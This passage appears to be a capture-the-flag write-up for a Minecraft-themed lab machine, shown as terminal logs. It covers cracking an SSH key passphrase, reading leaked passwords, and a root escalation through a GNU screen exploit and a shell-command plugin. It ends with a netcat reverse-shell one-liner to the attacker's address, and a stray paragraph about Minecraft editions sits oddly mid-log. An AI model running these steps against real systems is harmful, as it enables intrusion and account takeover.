+mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
+gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
+Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
+T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
+1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
+fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
+RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
+v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
+-----END RSA PRIVATE KEY-----
+
+let's save it
+
+┌──(witty㉿kali)-[/tmp]
+└─$ nano id_rsa_minecr
+                                                                  
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat id_rsa_minecr 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6
+
+Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
++Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
+SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
+SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
+lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
+FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
+sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
+stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
+eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
+VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
+LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
+jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
+Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
+8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
+DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
+0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
+MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
+mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
+gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
+Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
+T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
+1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
+fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
+RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
+v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
+-----END RSA PRIVATE KEY-----
+
+┌──(witty㉿kali)-[/tmp]
+└─$ chmod 600 id_rsa_minecr      
+                                                                                 
+┌──(witty㉿kali)-[/tmp]
+└─$ ssh -i id_rsa_minecr xxultimatecreeperxx@10.10.88.215
+The authenticity of host '10.10.88.215 (10.10.88.215)' can't be established.
+ED25519 key fingerprint is SHA256:ebA122u0ERUidN6lFg44jNzp3OoM/U4Fi4usT3C7+GM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.88.215' (ED25519) to the list of known hosts.
+Load key "id_rsa": error in libcrypto
+xxultimatecreeperxx@10.10.88.215's password: 
+Permission denied, please try again.
+xxultimatecreeperxx@10.10.88.215's password: 
+
+need to crack it
+
+                                                                                 
+┌──(witty㉿kali)-[/tmp]
+└─$ ssh2john id_rsa_minecr > id_hash                     
+                                                                                 
+┌──(witty㉿kali)-[/tmp]
+└─$ cat id_hash 
+id_rsa:$sshng$1$16$3579498908433674083EAAD00F2D89F6$1200$49cdc53db0afff80c8a5050e6a5b1cccd915091fa105da2200433c9ad6c5d91c60a2257b5c5d8f8047a1c095218720c6f816ffb92882d40b0bf943bc5a00ec6d2b01c0a2d68a39980a6b29d5f5a9df16865f6a9555b988e39721f1e7f7410d5448273b4e6589808fc1b7a93d27ad163538668ca7584ee68bca639526389a8e1a3bf7d067010584f3d8ce2f0137540e6649f732b4d2099071d047aecadb3d9fd27a028768d590cd2cc7c412fa150178d593ea5af7a44a0128f9390644606e902e95290df946ebab6ffe0c0d5efcb07dbbdba7c22fb351e7351b9bada9f98d3c81d8c81d991d6a57f037b2ab98a65b01fd164a9f9cddc9a57216db64ce30f60e38a0236a7dd7a6296138685b65fe53533d12b599907e8ce9e56394fc9e6a053b50b171b8c925c258612ae4cb63db08dd98e0488db9955115a495bb0df91e94898781139215880f6c4133d77189df0cd3e6b2d076ba432b9e620d3aed14dabac716a3b034a10b9b34abed499dc621c258734e4b31f88d8974ce3588ecd6684cb340784db5e0f52622188290d5a07329b0849e694eae6d520dce51eabab120dbbd4f21084ea38eae7ecd896ab3e0e4216daf55e6959db0368628faf641908bf001b52f4faef4438ffa1220ee1833264886f9c7fa68828cd50dc55b87d64dcb943ffa2e4bee811db05c6d9155d18d230ae1b64cfc6f9c5a52f2d8e009ffae02699fc8180e32098faeae290b398ac7731d295f8ce8e1e6a911c8a6057cf7a02b7da20df783dc5df5e0bdca05a0254a4b4f2a943ea28a94b536be327821dc22fc26938e1e2eaa936e1ca43531ebcb12b7bc08cdd4b0c985b803f874bf19d94ac53a90502a476f3fea98d3847a10d228dd2a0a4ef308ffbb6f69c90ca98a542858ee762a2b38233b8c37a39df91f0be119c25776c1478a690c09d6dc00cfdf5d856a347e0d00071ed7e9409607f76a21a63ddd1799894d3f9a2fc31f021494175d8c9e7f5df4c12e191288c07585e1dd4aebd96bd06a5148ec43ac069f3677d9a3290e3d18d9b2cc0add85f016edf1590165de667b37eeb20ce493a49809b8d7e22748e130130c878fabecc7043a19787f88ddd0f1cf7f74ddc5a38dcc7b40a23ebd2580c8af1c09dbc0ed56eca4f3da6ed9b63b9a96dc40572c6075efe84be1fdebe4486b28adc287bf5523dc109c84be95e266667897e775ee8490834dc115bcbc363e80862a03faf641b28e74bc870fec4fe12a57ed55459625d75bd0c3a9d7cb27a82530d34d6ccd661331c1332c1dd48284666fbb8a1faae2cd1104296c5742109f30ab4a28ffff8bab00de596841dfd24ebde5f60028cb38d7f6d0fd3bfb92f35c4fddd0263a6147048a772408bae0ec8c202807b56e308e210ab11ab936af5d4f36966a357002de35282fbe1c7171deebd5e822cb2bc7cd4b4e50fdd170e6b1bc7c18190c46cb592af3ca14684ec9ad5da24870504f2e8d90257d8f6465b066587d8187b9fea3b8e73751bd620d5d41e06934f7ae2f72578fa06fab74c5d62be1e67717cd1c3899c8de2d690801a7ae7a44a4cce3d23b32c743fee4caf42c8740613dab63de9258e48ddcc2af0716eb12e16082ebb9ac97d41e085aaaffa79e64bfafa38d01cecba6b4426db73b0ae12a13bc927d4e750316a9fb5fd83de112e04a47f1572c8ba08639b24758fd245b49
+                                                                                 
+┌──(witty㉿kali)-[/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+creepin2006      (id_rsa)     
+1g 0:00:00:02 DONE () 0.4854g/s 920403p/s 920403c/s 920403C/s creepygoblin..creek93
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano id_rsa_minecr  
+                                                                        
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chmod 600 id_rsa_minecr 
+                                                                        
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -i id_rsa_minecr xxultimatecreeperxx@10.10.173.88
+Enter passphrase for key 'id_rsa_minecr': 
+xxultimatecreeperxx@cybercrafted:~$ whoami
+xxultimatecreeperxx
+
+xxultimatecreeperxx@cybercrafted:/home$ find / -name "*minecraft*" 2> /dev/null
+/run/systemd/units/invocation:minecraft.service
+/var/lib/lxcfs/cgroup/blkio/system.slice/minecraft.service
+/var/lib/lxcfs/cgroup/pids/system.slice/minecraft.service
+/var/lib/lxcfs/cgroup/devices/system.slice/minecraft.service
+/var/lib/lxcfs/cgroup/memory/system.slice/minecraft.service
+/var/lib/lxcfs/cgroup/cpu,cpuacct/system.slice/minecraft.service
+/var/lib/lxcfs/cgroup/name=systemd/system.slice/minecraft.service
+/sys/kernel/slab/:A-0005888/cgroup/task_struct(574:minecraft.service)
+/sys/kernel/slab/:0000192/cgroup/kmalloc-192(574:minecraft.service)
+/sys/kernel/slab/:A-0000192/cgroup/cred_jar(574:minecraft.service)
+/sys/kernel/slab/:0001024/cgroup/kmalloc-1024(574:minecraft.service)
+/sys/kernel/slab/:A-0001024/cgroup/signal_cache(574:minecraft.service)
+/sys/kernel/slab/sock_inode_cache/cgroup/sock_inode_cache(574:minecraft.service)
+/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(574:minecraft.service)
+/sys/kernel/slab/proc_inode_cache/cgroup/proc_inode_cache(574:minecraft.service)
+/sys/kernel/slab/:A-0000064/cgroup/pid(574:minecraft.service)
+/sys/kernel/slab/anon_vma/cgroup/anon_vma(574:minecraft.service)
+/sys/kernel/slab/:A-0000704/cgroup/files_cache(574:minecraft.service)
+/sys/kernel/slab/:A-0000072/cgroup/eventpoll_pwq(574:minecraft.service)
+/sys/kernel/slab/:0000032/cgroup/kmalloc-32(574:minecraft.service)
+/sys/kernel/slab/inode_cache/cgroup/inode_cache(574:minecraft.service)
+/sys/kernel/slab/shmem_inode_cache/cgroup/shmem_inode_cache(574:minecraft.service)
+/sys/kernel/slab/:A-0002112/cgroup/mm_struct(574:minecraft.service)
+/sys/kernel/slab/sighand_cache/cgroup/sighand_cache(574:minecraft.service)
+/sys/kernel/slab/:A-0000256/cgroup/filp(574:minecraft.service)
+/sys/kernel/slab/:A-0000208/cgroup/vm_area_struct(574:minecraft.service)
+/sys/kernel/slab/ext4_inode_cache/cgroup/ext4_inode_cache(574:minecraft.service)
+/sys/kernel/slab/:aA-0000192/cgroup/dentry(574:minecraft.service)
+/sys/kernel/slab/:A-0000128/cgroup/eventpoll_epi(574:minecraft.service)
+/sys/fs/cgroup/blkio/system.slice/minecraft.service
+/sys/fs/cgroup/pids/system.slice/minecraft.service
+/sys/fs/cgroup/devices/system.slice/minecraft.service
+/sys/fs/cgroup/memory/system.slice/minecraft.service
+/sys/fs/cgroup/cpu,cpuacct/system.slice/minecraft.service
+/sys/fs/cgroup/systemd/system.slice/minecraft.service
+/sys/fs/cgroup/unified/system.slice/minecraft.service
+/opt/minecraft
+/opt/minecraft/minecraft_server_flag.txt
+/etc/systemd/system/multi-user.target.wants/minecraft.service
+/etc/systemd/system/minecraft.service
+
+xxultimatecreeperxx@cybercrafted:/home$ cat /opt/minecraft/minecraft_server_flag.txt
+THM{ba93767ae3db9f5b8399680040a0c99e}
+
+xxultimatecreeperxx@cybercrafted:/home$ cd /opt/minecraft/
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
+cybercrafted  minecraft_server_flag.txt  note.txt  WorldBackup
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt
+Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
+- cybercrafted
+
+P.S
+Will remove the whitelist soon.
+
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd WorldBackup/
+-bash: cd: WorldBackup/: Permission denied
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
+cybercrafted  minecraft_server_flag.txt  note.txt  WorldBackup
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd cybercrafted/
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ ls
+banned-ips.txt      craftbukkit-1.7.2-server.jar  permissions.yml    white-list.txt
+banned-players.txt  help.yml                      plugins            world
+bukkit.yml          logs                          server-icon.png    world_nether
+commands.yml        ops.txt                       server.properties  world_the_end
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cat ops.txt 
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cat white-list.txt 
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cd plugins/
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
+LoginSystem  LoginSystem_v.2.4.jar
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd LoginSystem/
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
+language.yml  log.txt  passwords.yml  settings.yml
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt  
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] cybercrafted registered. PW: JavaEdition>Bedrock
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] cybercrafted logged in. PW: JavaEdition>Bedrock
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] cybercrafted logged in. PW: JavaEdition>Bedrock
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] cybercrafted logged in. PW: JavaEdition>Bedrock
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] madrinch logged in. PW: Password123
+
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] [BUKKIT-SERVER] Startet LoginSystem!
+[] [BUKKIT-SERVER] Startet LoginSystem!
+
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
+Password: JavaEdition>Bedrock
+
+Java Edition and Bedrock are two different versions of Minecraft that are available for different platforms.
+
+Java Edition is available for PC, Mac, and Linux and is the original version of Minecraft that was first released in 2009. It is often referred to as the "Java" version of Minecraft and is developed and published by Mojang Studios.
+
+Bedrock Edition, on the other hand, is available for a variety of platforms, including Windows 10, Xbox One, Nintendo Switch, and mobile devices. It is a cross-platform version of Minecraft that allows players on different devices to play together. Bedrock Edition is developed and published by Mojang Studios, in partnership with Xbox Game Studios.
+
+Both versions of Minecraft have their own unique features and gameplay mechanics, and the availability of certain mods, resource packs, and servers may differ between the two versions.
+
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
+cybercrafted: dcbf543ee264e2d3a32c967d663e979e
+madrinch: 42f749ade7f9e195bf475f37a44cafcb
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cd /home/cybercrafted/
+cybercrafted@cybercrafted:~$ ls
+user.txt
+cybercrafted@cybercrafted:~$ cat user.txt 
+THM{b4aa20aaf08f174473ab0325b24a45ca}
+
+cybercrafted@cybercrafted:~$ sudo -l
+[sudo] password for cybercrafted: 
+Matching Defaults entries for cybercrafted on cybercrafted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User cybercrafted may run the following commands on cybercrafted:
+    (root) /usr/bin/screen -r cybercrafted
+
+https://www.exploit-db.com/exploits/41154
+
+cybercrafted@cybercrafted:~$ wget http://10.8.19.103:1234/screenroot.sh
+--  http://10.8.19.103:1234/screenroot.sh
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1152 (1.1K) [text/x-sh]
+Saving to: ‘screenroot.sh’
+
+screenroot.sh                 100%[==============================================>]   1.12K  --.-KB/s    in 0s      
+
+(108 MB/s) - ‘screenroot.sh’ saved [1152/1152]
+
+cybercrafted@cybercrafted:~$ chmod +x screenroot.sh
+cybercrafted@cybercrafted:~$ ./screenroot.sh 
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+/tmp/libhax.c: In function ‘dropshell’:
+/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
+     chmod("/tmp/rootshell", 04755);
+     ^~~~~
+     chroot
+/tmp/rootshell.c: In function ‘main’:
+/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     setuid(0);
+     ^~~~~~
+     setbuf
+/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     setgid(0);
+     ^~~~~~
+     setbuf
+/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
+     seteuid(0);
+     ^~~~~~~
+     setbuf
+/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
+     setegid(0);
+     ^~~~~~~
+/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
+     execvp("/bin/sh", NULL, NULL);
+     ^~~~~~
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+No Sockets found in /run/screen/S-cybercrafted.
+```
+```text
+$ whoami
+cybercrafted
+```
+```text
+$ find / -perm -4000 2>/dev/null | xargs ls -lah
+-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root        43K Sep 16  2020 /bin/mount
+-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root   root        27K Sep 16  2020 /bin/umount
+-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root        40K Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root        37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root        59K Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root        22K Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root       146K Jan 19  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root   root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root       427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root   root       116K Mar 26  2021 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.173.88 - - [08/Mar/2023 16:19:13] "GET /screenroot.sh HTTP/1.1" 200 -
+
+Nope
+
+cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
+ctrl + a (create a window with a shell) , ctrl + c (switch window)
+```
+```text
+# whoami
+root
+```
+```text
+# cd /root
+```
+```text
+# ls
+root.txt
+```
+```text
+# cat root.txt
+THM{8bb1eda065ceefb5795a245568350a70}
+
+or
+
+downloading plugin 
+
+https://github.com/Frazew/BukkitTTY
+
+https://github.com/Frazew/BukkitTTY/releases/download/v0.0.2/BukkitTTY-0.0.2.jar
+
+ctrl+a (released), d to close
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.173.88 - - [08/Mar/2023 16:38:01] "GET /BukkitTTY-0.0.2.jar HTTP/1.1" 200 -
+
+cybercrafted@cybercrafted:~$ wget http://10.8.19.103:1234/BukkitTTY-0.0.2.jar
+--  http://10.8.19.103:1234/BukkitTTY-0.0.2.jar
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5294 (5.2K) [application/java-archive]
+Saving to: ‘BukkitTTY-0.0.2.jar’
+
+BukkitTTY-0.0.2.jar           100%[==============================================>]   5.17K  --.-KB/s    in 0.006s  
+
+(869 KB/s) - ‘BukkitTTY-0.0.2.jar’ saved [5294/5294]
+
+cybercrafted@cybercrafted:~$ ls -lah
+total 44K
+drwxr-x--- 4 cybercrafted cybercrafted 4.0K Mar  8 21:38 .
+drwxr-xr-x 4 root         root         4.0K Jun 27  2021 ..
+lrwxrwxrwx 1 root         root            9 Sep 12  2021 .bash_history -> /dev/null
+-rwxr-x--- 1 cybercrafted cybercrafted  220 Jun 27  2021 .bash_logout
+-rwxr-x--- 1 cybercrafted cybercrafted 3.7K Jun 27  2021 .bashrc
+-rw-rw-r-- 1 cybercrafted cybercrafted 5.2K Mar  8 21:37 BukkitTTY-0.0.2.jar
+drwx------ 2 cybercrafted cybercrafted 4.0K Sep 12  2021 .cache
+drwx------ 3 cybercrafted cybercrafted 4.0K Sep 12  2021 .gnupg
+-rwxr-x--- 1 cybercrafted cybercrafted  807 Jun 27  2021 .profile
+-rwxrwxr-x 1 cybercrafted cybercrafted 1.2K Feb 18 17:23 screenroot.sh
+-rw-r----- 1 cybercrafted cybercrafted   38 Jun 27  2021 user.txt
+cybercrafted@cybercrafted:~$ chmod 750 BukkitTTY-0.0.2.jar
+cybercrafted@cybercrafted:~$ ls -lah
+total 44K
+drwxr-x--- 4 cybercrafted cybercrafted 4.0K Mar  8 21:38 .
+drwxr-xr-x 4 root         root         4.0K Jun 27  2021 ..
+lrwxrwxrwx 1 root         root            9 Sep 12  2021 .bash_history -> /dev/null
+-rwxr-x--- 1 cybercrafted cybercrafted  220 Jun 27  2021 .bash_logout
+-rwxr-x--- 1 cybercrafted cybercrafted 3.7K Jun 27  2021 .bashrc
+-rwxr-x--- 1 cybercrafted cybercrafted 5.2K Mar  8 21:37 BukkitTTY-0.0.2.jar
+drwx------ 2 cybercrafted cybercrafted 4.0K Sep 12  2021 .cache
+drwx------ 3 cybercrafted cybercrafted 4.0K Sep 12  2021 .gnupg
+-rwxr-x--- 1 cybercrafted cybercrafted  807 Jun 27  2021 .profile
+-rwxrwxr-x 1 cybercrafted cybercrafted 1.2K Feb 18 17:23 screenroot.sh
+-rw-r----- 1 cybercrafted cybercrafted   38 Jun 27  2021 user.txt
+
+red color not executable, green yep
+
+cybercrafted@cybercrafted:~$ chmod +x BukkitTTY-0.0.2.jar
+
+cybercrafted@cybercrafted:~$ cd /opt/minecraft/cybercrafted/plugins/
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
+LoginSystem  LoginSystem_v.2.4.jar
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cp /home/cybercrafted/BukkitTTY-0.0.2.jar .
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
+BukkitTTY-0.0.2.jar  LoginSystem  LoginSystem_v.2.4.jar
+
+cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
+-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
+        at net.minecraft.server.v1_7_R1.MinecraftServer.a(MinecraftServer.java:275) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
+        at net.minecraft.server.v1_7_R1.DedicatedServer.init(DedicatedServer.java:175) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
+        at net.minecraft.server.v1_7_R1.MinecraftServer.run(MinecraftServer.java:424) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
+        at net.minecraft.server.v1_7_R1.ThreadServerApplication.run(SourceFile:617) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
+Caused by: java.lang.ClassNotFoundException: org.spigotmc.Metrics
+        at java.base/java.net.URLClassLoader.findClass(URLClassLoader.java:471) ~[?:?]
+        at org.bukkit.plugin.java.PluginClassLoader.findClass(PluginClassLoader.java:77) ~[craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
+        at org.bukkit.plugin.java.PluginClassLoader.findClass(PluginClassLoader.java:62) ~[craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
+        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:589) ~[?:?]
+        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:522) ~[?:?]
+        ... 12 more
+[21:30:28 INFO]: Server permissions file permissions.yml is empty, ignoring it
+[21:30:28 INFO]: Done (0.826s)! For help, type "help" or "?"
+[21:32:36 WARN]: Could not get information about this CraftBukkit version; perhaps you are running a custom one?: ConnectException
+[21:34:47 WARN]: Could not get latest artifact information: ConnectException
+
+>plugins
+[21:43:53 INFO]: Plugins (1): LoginSystem
+
+need to reload server minecraft
+
+>reload
+[21:44:29 INFO]: Server permissions file permissions.yml is empty, ignoring it
+[21:44:29 INFO]: CONSOLE: Reload complete.
+
+>plugins
+[21:47:21 INFO]: Plugins (2): BukkitTTY, LoginSystem
+
+using help command
+
+>help
+[21:47:39 INFO]: /setblock: A Mojang provided command.
+[21:47:39 INFO]: /setidletimeout: Sets the server's idle timeout
+[21:47:39 INFO]: /setworldspawn: Sets a worlds's spawn point. If no coordinates are specified, the player's coordinates will be used.
+[21:47:39 INFO]: /shell: Lance une commande shell dans un repertoire
+[21:47:39 INFO]: /spawnpoint: Sets a player's spawn point
+[21:47:39 INFO]: /spreadplayers: Spreads players around a point
+[21:47:39 INFO]: /stop: Stops the server with optional reason
+[21:47:39 INFO]: /summon: A Mojang provided command.
+[21:47:39 INFO]: /tell: Sends a private message to the given player
+[21:47:39 INFO]: /tellraw: A Mojang provided command.
+[21:47:39 INFO]: /testfor: Tests whether a specifed player is online
+[21:47:39 INFO]: /testforblock: A Mojang provided command.
+[21:47:39 INFO]: /time: Changes the time on each world
+[21:47:39 INFO]: /timings: Records timings for all plugin events
+[21:47:39 INFO]: /toggledownfall: Toggles rain on/off on a given world
+[21:47:39 INFO]: /tp: Teleports the given player (or yourself) to another player or coordinates
+[21:47:39 INFO]: /unregister: 
+[21:47:39 INFO]: /version: Gets the version of this server including any plugins in use
+[21:47:39 INFO]: /weather: Changes the weather
+[21:47:39 INFO]: /whitelist: Manages the list of players allowed to use this server
+[21:47:39 INFO]: /xp: Gives the specified player a certain amount of experience. Specify <amount>L to give levels instead, with a negative amount resulting in taking levels.
+
+>shell whoami
+[22:37:41 INFO]: Commande : whoami dans .
+[22:37:41 INFO]: root
+[22:37:41 INFO]: root
+[22:37:41 INFO]: Terminé
+>shell cat /root/root.txt
+[22:37:57 INFO]: Commande : cat /root/root.txt dans .
+[22:37:57 INFO]: THM{8bb1eda065ceefb5795a245568350a70}
+[22:37:57 INFO]: THM{8bb1eda065ceefb5795a245568350a70}
+[22:37:57 INFO]: Terminé
+
+>shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1338 >/tmp/f
+[22:38:47 INFO]: Commande : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1338 >/tmp/f dans .
